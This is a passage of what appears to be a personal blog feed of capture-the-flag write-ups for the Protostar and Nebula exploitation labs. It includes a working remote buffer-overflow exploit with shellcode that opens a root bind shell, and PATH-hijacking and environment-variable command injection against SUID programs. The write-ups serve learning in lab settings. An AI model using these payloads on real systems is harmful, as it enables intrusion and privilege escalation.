    <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>

    <span class="n">expected</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>

    <span class="k">if</span><span class="p">(</span><span class="n">writev</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">v</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">!=</span> <span class="n">expected</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"failed to write correct amount of bytes"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">run</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">){</span>
    <span class="n">u_int16_t</span> <span class="n">len</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">loggedin</span><span class="p">;</span>

    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">nread</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">));</span>
        <span class="n">len</span> <span class="o">=</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
        <span class="n">buffer</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span> <span class="n">buffer</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"malloc failure for %d bytes"</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>

        <span class="n">nread</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>

        <span class="k">switch</span><span class="p">(</span><span class="n">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">{</span>
            <span class="k">case</span> <span class="mi">23</span><span class="p">:</span>
                <span class="n">loggedin</span> <span class="o">=</span> <span class="n">login</span><span class="p">(</span><span class="n">buffer</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
                <span class="n">send_string</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="n">loggedin</span> <span class="o">?</span> <span class="s">"successful"</span> <span class="o">:</span> <span class="s">"failed"</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
            
            <span class="nl">default:</span>
                <span class="n">send_string</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="s">"what you talkin about willis?"</span><span class="p">);</span>
                <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>

    <span class="cm">/* Run the process as a daemon */</span>
    <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span> 
    
    <span class="cm">/* Wait for socket activity and return */</span>
    <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>

    <span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
    <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>

    <span class="cm">/* Don't do this :&gt; */</span>
    <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>

    <span class="n">run</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<ol>
  <li>What this program does is waiting for connections on port 2996 and checking the login creentials. After launching net3, we can test it with <code class="language-plaintext highlighter-rouge">nc 127.0.0.1 2996</code>.</li>
  <li>The credentials have to be sent in a specific format: first send the total byte length of the login string, then in a second send push the string itself. This string has to contain the service, username and password, each prepended with its own size and appended with a NULL byte.</li>
  <li>
    <p>Again we create a python script that connects to the deamon, reads the data, manipulates it and sends it back.</p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kn">import</span> <span class="n">socket</span>
 <span class="kn">import</span> <span class="n">re</span>
 <span class="kn">import</span> <span class="n">struct</span>

 <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
 <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span><span class="p">,</span> <span class="mi">2996</span><span class="p">))</span>

 <span class="n">login_string</span> <span class="o">=</span> <span class="sh">"</span><span class="se">\x17</span><span class="sh">"</span>
 <span class="n">login_string</span> <span class="o">+=</span> <span class="sh">"</span><span class="se">\x05</span><span class="s">net3</span><span class="se">\x00</span><span class="sh">"</span>
 <span class="n">login_string</span> <span class="o">+=</span> <span class="sh">"</span><span class="se">\x0d</span><span class="s">awesomesauce</span><span class="se">\x00</span><span class="sh">"</span>
 <span class="n">login_string</span> <span class="o">+=</span> <span class="sh">"</span><span class="se">\x0a</span><span class="s">password</span><span class="se">\x00</span><span class="sh">"</span>

 <span class="n">login_length</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">login_string</span><span class="p">)</span>

 <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&gt;H</span><span class="sh">"</span><span class="p">,</span> <span class="n">login_length</span><span class="p">))</span>
 <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">login_string</span><span class="p">)</span>
 <span class="k">print</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
 <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div>    </div>
  </li>
  <li>The script creates the login string: first of all the “secret” byte to access the login functionality, then the name of the service, then the username and at the end the password. The length of this string is sent as unsigned short (as defined in the C code), then the string itself is sent out. The terminating NULL is required by the strcpy method.</li>
</ol>

<h3 id="final-00">[Final 00]</h3>
<p>Combine a stack overflow and network programming for a remote overflow.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define NAME "final0"
#define UID 0
#define GID 0
#define PORT 2995
</span>
<span class="cm">/*
    * Read the username in from the network
    */</span>

<span class="kt">char</span> <span class="o">*</span><span class="nf">get_username</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>

    <span class="n">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

    <span class="cm">/* Strip off trailing new line characters */</span>
    <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="sc">'\n'</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">*</span><span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="sc">'\r'</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">*</span><span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="cm">/* Convert to lower case */</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">toupper</span><span class="p">(</span><span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
    <span class="p">}</span>

    <span class="cm">/* Duplicate the string and return it */</span>
    <span class="k">return</span> <span class="n">strdup</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>

    <span class="cm">/* Run the process as a daemon */</span>
    <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span> 
    
    <span class="cm">/* Wait for socket activity and return */</span>
    <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>

    <span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
    <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>

    <span class="n">username</span> <span class="o">=</span> <span class="n">get_username</span><span class="p">();</span>
    
    <span class="n">printf</span><span class="p">(</span><span class="s">"No such user %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">username</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>nopsled: a NOP sled is a sequence of NOP (no-operation) instructions that are usually inserted as a landing zone for a jump that doesn’t have a precise target address. A nopsled gives a larger landing space, easier to guess than a single address, and will make the execution flow down to the actual starting point without secondary effects.</p>
</blockquote>

<ol>
  <li>Upon connection, the service expects a username to be checked for existence. It is clear from the code that there is no actual check in place, therefore the goal of this challenge is to spawn a shell thanks to a buffer overflow in the username that we pass.</li>
  <li>
    <p>The first thing to do is to check how many characters we need to pass to overwrite the $eip after the buffer. We can’t do it automatically with the service we used until now because the toUpper function will mix up the results, so we will do it manually:</p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kn">import</span> <span class="n">socket</span>
 <span class="kn">import</span> <span class="n">struct</span>

 <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
 <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span><span class="p">,</span> <span class="mi">2995</span><span class="p">))</span>

 <span class="n">offset</span> <span class="o">=</span> <span class="sh">'</span><span class="s">a</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">512</span> <span class="o">+</span> <span class="sh">'</span><span class="s">b</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">c</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="sh">'</span><span class="s">d</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">4</span>

 <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
</code></pre></div>    </div>
  </li>
  <li>After executing the python script we switch to a root account with <code class="language-plaintext highlighter-rouge">su root</code> and password <code class="language-plaintext highlighter-rouge">godmode</code> to check if we managed to cause a segmentation fault. If yes, the core dump file is saved in /tmp and we can look at it with <code class="language-plaintext highlighter-rouge">gdb --core /tmp/core_xxx</code>. In this case we will see with what $eip crashed, and can adjust the length of our offset payload.</li>
  <li>If no segfault happened, we have to try again with a longer payload. The goal is to find the perfect offset to be able to put an address in $eip, and this number is 532.</li>
  <li>The shellcode that we want to use has to be resistent to the <code class="language-plaintext highlighter-rouge">toUpper</code> method. A working example can be taken from Exploit DB. Upon execution, we will be able to netcat to port 5074 and we should get a root shell.</li>
  <li>
    <p>We can now start to build the payload, knowing that we will need a return address that points at the start of the buffer but remembering that we don’t know the exact starting address of the buffer itself. To solve this problem, we start the payload with a nopsled, so that we can aim at the buffer without having to worry about guessing the precise address. After the sled we place the shellcode, than we pad with whatever until we reach the $eip, and there we put a mock address.</p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kn">import</span> <span class="n">socket</span>
 <span class="kn">import</span> <span class="n">struct</span>

 <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
 <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">127.0.0.1</span><span class="sh">"</span><span class="p">,</span> <span class="mi">2995</span><span class="p">))</span>

 <span class="n">nop</span> <span class="o">=</span> <span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span><span class="o">*</span><span class="mi">24</span>

 <span class="n">shellcode</span> <span class="o">=</span> <span class="sh">"</span><span class="se">\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5f\x81\xef\xdf\xff\xff\xff</span><span class="sh">"</span> \
 <span class="sh">"</span><span class="se">\x57\x5e\x29\xc9\x80\xc1\xb8\x8a\x07\x2c\x41\xc0\xe0\x04\x47</span><span class="sh">"</span> \
 <span class="sh">"</span><span class="se">\x02\x07\x2c\x41\x88\x06\x46\x47\x49\xe2\xed</span><span class="sh">"</span> \
 <span class="sh">"</span><span class="s">DBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKB</span><span class="sh">"</span> \
 <span class="sh">"</span><span class="s">AFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIA</span><span class="sh">"</span> \
 <span class="sh">"</span><span class="s">JDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJO</span><span class="sh">"</span> \
 <span class="sh">"</span><span class="s">BLAALMNIA</span><span class="sh">"</span>

 <span class="n">padding</span> <span class="o">=</span> <span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="p">(</span><span class="mi">532</span><span class="o">-</span><span class="nf">len</span><span class="p">(</span><span class="n">nop</span><span class="p">)</span><span class="o">-</span><span class="nf">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>

 <span class="n">ret</span> <span class="o">=</span> <span class="sh">"</span><span class="se">\xaa\xaa\xaa\xaa</span><span class="sh">"</span>

 <span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">nop</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">ret</span><span class="p">)</span>
</code></pre></div>    </div>
  </li>
  <li>Running this script causes another segmentation fault, because our return address is obviously non-existing. So what we have to do is to find out a return address that makes sense. We start gdb again with the core dump, and we look at the registers, with <code class="language-plaintext highlighter-rouge">i r</code>. What we are interested in is the $esp register, that tells us where the stack ends.</li>
  <li>Now it’s a matter of patience while looking at the stack content until we find our nopsled: we go through the memory with <code class="language-plaintext highlighter-rouge">gdb &gt; x/100x $esp-x</code>, where we increase x until we find the bunc of ‘90’ that correspond to the nop instructions.</li>
  <li>We pick an address that points somewhere in the middle of the sled, in this way we can be sure that no matter what little shifts the stack will go through during execution we will still land in the proper place and peacefully slide down to the shellcode. We can pick 0xbffffa50, substitute it as the return address in our last script and run it again.</li>
  <li>Our code executed nicely, and returned. We can now run netcat and check if we got actual root shell by issuing the whoami command: <code class="language-plaintext highlighter-rouge">nc 127.0.0.1 5074</code></li>
</ol>

<p>I find it a bit odd that to see if this exploit works we need to login with the godmode account. Makes me wonder if there is another approach, or if the whole attack should be carried out blindly.</p>

<h3 id="final-01">[Final 01]</h3>
<h3 id="final-02">[Final 02]</h3>
<hr />]]></content><author><name>P2</name></author><category term="CTF" /><summary type="html"><![CDATA[CTF by Andrew Griffiths @ https://exploit.education/protostar/ This Capture the Flag introduces system internals concepts like sockets and networking, stack and heap overflows, format strings and byte ordering. I guess I will be googling most of that and do my best to keep track of the steps, and see to get help from the ones that are much better at me in these topics.]]></summary></entry><entry><title type="html">Nebula CTF</title><link href="http://localhost:4000/ctf/2023/11/05/Nebula.html" rel="alternate" type="text/html" title="Nebula CTF" /><published>2023-11-05T00:00:00+01:00</published><updated>2023-11-05T00:00:00+01:00</updated><id>http://localhost:4000/ctf/2023/11/05/Nebula</id><content type="html" xml:base="http://localhost:4000/ctf/2023/11/05/Nebula.html"><![CDATA[<p><img src="https://cdn.pixabay.com/photo/2017/09/12/11/56/universe-2742113_1280.jpg" alt="center-aligned-image" class="align-center" /></p>

<p class="notice--info">CTF by <strong>Andrew Griffiths</strong> @ <a href="https://exploit.education/nebula/">https://exploit.education/nebula/</a></p>

<p>This Capture the Flag introduces sysadmin Linux concepts. There will be SUID fils, permissions, race conditions and other topics.
I guess I will be googling most of that and do my best to keep track of the steps, and see to get help from the ones that are much better at me in these topics.</p>

<!--more-->

<table>
  <thead>
    <tr>
      <th>Content:</th>
      <th> </th>
      <th> </th>
      <th> </th>
      <th> </th>
      <th> </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><a href="#install">Install</a></td>
      <td><a href="#level-00">Level00</a></td>
      <td><a href="#level-01">Level01</a></td>
      <td><a href="#level-02">Level02</a></td>
      <td><a href="#level-03">Level03</a></td>
      <td><a href="#level-04">Level04</a></td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td><a href="#level-05">Level05</a></td>
      <td><a href="#level-06">Level06</a></td>
      <td><a href="#level-07">Level07</a></td>
      <td><a href="#level-08">Level08</a></td>
      <td><a href="#level-09">Level09</a></td>
      <td><a href="#level-10">Level10</a></td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td><a href="#level-11">Level11</a></td>
      <td><a href="#level-12">Level12</a></td>
      <td><a href="#level-13">Level13</a></td>
      <td><a href="#level-14">Level14</a></td>
      <td><a href="#level-15">Level15</a></td>
      <td><a href="#level-16">Level16</a></td>
    </tr>
  </tbody>
  <tbody>
    <tr>
      <td><a href="#level-17">Level17</a></td>
      <td><a href="#level-18">Level18</a></td>
      <td><a href="#level-19">Level19</a></td>
      <td> </td>
      <td> </td>
      <td> </td>
    </tr>
  </tbody>
</table>

<h1 id="capture-the-flag">Capture the Flag</h1>

<h3 id="install">[Install]</h3>
<p>The CTF is downloadable as ISO image, and needs to be mounted. <br />
To mount it use VirtualBox (or VMware or similar) and create an Ubuntu machine, then pass the iso as bootable media. <br />
For each level, access the machine with the given credentials, where XX corresponds to the target level:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>```
User: "levelXX"
Password: "levelXX"
```
</code></pre></div></div>

<p>To access, retrieve the IP of the CTF machine, for example with the <code class="language-plaintext highlighter-rouge">ip a</code> command. <br />
Then connect to the machine with SSH, using the credentials and the command <code class="language-plaintext highlighter-rouge">ssh levelXX@[ipaddr]</code> <br />
If you want to install anything in the VM, you can login with the <code class="language-plaintext highlighter-rouge">nebula:nebula</code> credentials.</p>

<h3 id="level-00">[Level 00]</h3>
<p>This level requires to find a Set User ID program that will run as the “flag00” account.</p>

<blockquote>
  <p>SUID (Set owner User ID): is a special type of permission give to a file. Usually then a program runs it gets the permissions from the current user. SUID instead temporarily gives the permissions of the file owner instead that of the user actually running the file. The user will get the permissions of the file owner, together with the UID and GID of the owner.</p>
</blockquote>

<blockquote>
  <p>Permissions are given in triplets of rwx (read, write execute) values, and the additional s value for the SUID case.
The first rwx triplet represent permission for the owner, the second triplet permission for the group and the third triplet permission for the other use of the file.</p>
</blockquote>

<ol>
  <li>
    <p>The hint says that it is possible to search for the file that we are interested in. <br />
We know the flag has to be executable and we know that its owner is the user flag00, so we use the <code class="language-plaintext highlighter-rouge">find</code> command, using the <code class="language-plaintext highlighter-rouge">/</code> to start looking at the root folder, the <code class="language-plaintext highlighter-rouge">-execute</code> parameter to return only executable files and the <code class="language-plaintext highlighter-rouge">-user</code> parameter to return only the files owned by the given user.</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> find / <span class="nt">-execute</span> <span class="nt">-user</span> flag00
</code></pre></div>    </div>
  </li>
  <li>
    <p>The search will return a lot of files, most of them with denied permission (we could have prevented this by adding <code class="language-plaintext highlighter-rouge">2&gt;/dev/null</code> at the end of the find command). <br />
Among this list there are two for which it seems we have permissions: <code class="language-plaintext highlighter-rouge">/home/flag00</code> and <code class="language-plaintext highlighter-rouge">/bin/.../flag00</code>. We inspect them with the command <code class="language-plaintext highlighter-rouge">ls -l</code></p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> drwxr-x--- /home/flag00
 <span class="nt">-rwsr-x---</span> /bin/.../flag00
</code></pre></div>    </div>
  </li>
  <li>
    <p>The permissions of the retrieved files show how <code class="language-plaintext highlighter-rouge">/bin/.../flag00</code> has the SUID flag and is a file that we can execute. <br />
After running it, we are told to execute the <code class="language-plaintext highlighter-rouge">getflag</code> command, which results in successfully getting the flag.</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ./bin/.../flag00
 getflag
</code></pre></div>    </div>
  </li>
</ol>

<h3 id="level-01">[Level 01]</h3>
<p>There is a vulnerability in the code stored in /home/flag01 that allows arbitrary programs to be executed</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
    <span class="n">gid_t</span> <span class="n">gid</span><span class="p">;</span>
    <span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>
    <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
    <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>

    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
    <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>

    <span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/env echo and now what?"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>int system(const char *command): the C library function system() takes as parameter a string containing the name of a requested variable. This variable, that can be a command or program name, is passed to the host environment to be executed. The function returns after the command has been completed.</p>
</blockquote>

<blockquote>
  <p>env: it’s a linux command to show the environment or run a program in a modified environment. The program to be run (or the path to it) can be passed as an argument.</p>
</blockquote>

<ol>
  <li>The interesting part in the code is the call to the <code class="language-plaintext highlighter-rouge">echo</code> method using the <code class="language-plaintext highlighter-rouge">system()</code> function. The given path points to the <code class="language-plaintext highlighter-rouge">env</code> command, which runs the <code class="language-plaintext highlighter-rouge">echo</code> command, which in turn is retrieved from the system variable <code class="language-plaintext highlighter-rouge">PATH</code>.</li>
  <li>
    <p>By changing what is in <code class="language-plaintext highlighter-rouge">PATH</code> we can control what will be invoked by the <code class="language-plaintext highlighter-rouge">system()</code> call. To do this we prepend our own folder to <code class="language-plaintext highlighter-rouge">PATH</code>. We use the <code class="language-plaintext highlighter-rouge">/tmp</code> folder, which is already existing in root.</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
 <span class="nb">echo</span> <span class="nv">$PATH</span> <span class="c"># to check if the previous command worked</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>In the <code class="language-plaintext highlighter-rouge">/tmp</code> folder we can now create a shell script that launches bash. To do this, we <code class="language-plaintext highlighter-rouge">echo -e</code> (the -e option is to enable the correct backslash interpretation) the content of our script to the file we need. This file will be named <code class="language-plaintext highlighter-rouge">echo</code> so that it will be correctly executed by the calling program. Then we take care of making it executable.</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s1">'#!/bin/bash\n/bin/bash'</span> <span class="o">&gt;</span> /tmp/echo
 <span class="nb">chmod</span> +x /tmp/echo
</code></pre></div>    </div>
  </li>
  <li>
    <p>The permissions of the flag01 program has the SUID set, therefore whatever will be invoked by the program will have the permission of the owner, resulting in escalated permissions for us. We run flag01, and we are told to execute the <code class="language-plaintext highlighter-rouge">getflag</code> command, which results in successfully getting the flag.</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ./flag01 <span class="c"># remember to execute from the correct folder</span>
 getflag
</code></pre></div>    </div>
  </li>
</ol>

<h3 id="level-02">[Level 02]</h3>
<p>There is a vulnerability in the code stored in /home/flag02 that allows arbitrary programs to be executed</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>

    <span class="n">gid_t</span> <span class="n">gid</span><span class="p">;</span>
    <span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>

    <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
    <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>

    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
    <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>

    <span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">"/bin/echo %s is cool"</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"USER"</span><span class="p">));</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"about to call system(</span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
    
    <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>int asprintf(char **strp, const char *fmt, …): the C library function asprintf() is a print method that takes care of allocation: it calculates the length of the string, allocates that amount of memory, and writes the string into it. The pointer to this allocated memory is returned via the first argument, while the second argument is the string to be printed.
This is different from printf, that prints to the standard output instead that to a memory location, and from sprintf, that prints to a memory location but without caring about the length of the string and the available space.</p>
</blockquote>

<blockquote>
  <p>char *getenv(const char *name): the C library function getenv() searches for the environment string pointed to by the parameter and returns the associated value.</p>
</blockquote>

<ol>
  <li>Similarly to what happened in level01, we will call the <code class="language-plaintext highlighter-rouge">system()</code> method to run a command, but instead of passing directly a path we will pass a pointer to a string containing the path. This string will echo a variable from the environment, and that’s what we want to modify.</li>
  <li>
    <p>We modify the variable <code class="language-plaintext highlighter-rouge">USER</code> so that it completes the previous command and appends the new ones to be executed. In particular, we want to append a command to open a bash terminal. Appending commands can be done using <code class="language-plaintext highlighter-rouge">&amp;&amp;</code>. We make sure to finish the new command with an invocation to <code class="language-plaintext highlighter-rouge">echo</code> so that the following text will not be interpreted as parameter to the shell invocation and break the command.</p>

